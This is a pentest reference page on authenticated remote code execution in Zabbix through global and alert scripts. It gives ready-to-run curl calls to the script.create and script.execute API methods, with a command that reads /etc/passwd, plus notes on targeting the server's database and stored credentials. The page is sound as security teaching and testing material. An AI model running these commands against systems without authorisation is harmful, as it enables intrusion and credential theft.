---
title: "Global and alert scripts: command execution on the Zabbix server"
description: "Zabbix global scripts and alert (action) scripts of type Script run attacker-defined commands, executed on the Zabbix server or a chosen agent. A Super admin creates a script of type Script with a command and runs it from the UI or via the API's script.execute, giving code execution as the Zabbix server's service account, the classic authenticated Zabbix RCE."
keywords:
  - global scripts
  - alert scripts
  - script.execute
  - zabbix server
  - rce
---

# Global and alert scripts

Zabbix lets administrators define scripts that run commands, and this is the most direct authenticated code-execution path. A global script (Alerts > Scripts) of type "Script" contains a command and is configured to execute on the Zabbix server, a Zabbix agent, or a proxy; an alert (action) script runs similarly when an action fires. A Super admin creates such a script with an attacker command and executes it, from the UI or through the API's `script.create` + `script.execute`, and the command runs on the chosen target as that component's service account. Executing on the Zabbix server yields a foothold on the monitoring host itself (and access to its database and all stored credentials); executing on an agent reaches a monitored host. This is the canonical post-authentication Zabbix RCE.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# create a global script of type Script (type 0) that runs on the Zabbix server (execute_on 1)
SID=$(curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"script.create","params":{
  "name":"x","type":0,"command":"id; cat /etc/passwd","scope":1,"execute_on":1},"auth":"'"$TOK"'","id":1}' | jq -r .result.scriptids[0])
# execute it against a host; output is returned in the API response
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"script.execute","params":{"scriptid":"'"$SID"'","hostid":"<HOSTID>"},"auth":"'"$TOK"'","id":1}'
```

## Exploitation notes

- `execute_on` selects the target: on the Zabbix server (foothold on the monitoring host plus its DB and all stored credentials) or on an agent (reach a monitored host); the server is usually the higher-value target.
- The command runs as the Zabbix server's service account; the output is returned directly in the `script.execute` response, so it is a clean interactive-style primitive.
- This requires the script-management permission, which Super admin has; it is the reason a Super-admin Zabbix account is effectively server code execution.
- `alertscripts` (action-operation scripts) are the alerting equivalent and run from the server's external-scripts directory; both reach the same execution.

## References

- [Zabbix: scripts](https://www.zabbix.com/documentation/current/en/manual/web_interface/frontend_sections/alerts/scripts)
- [HackTricks: Zabbix scripts RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
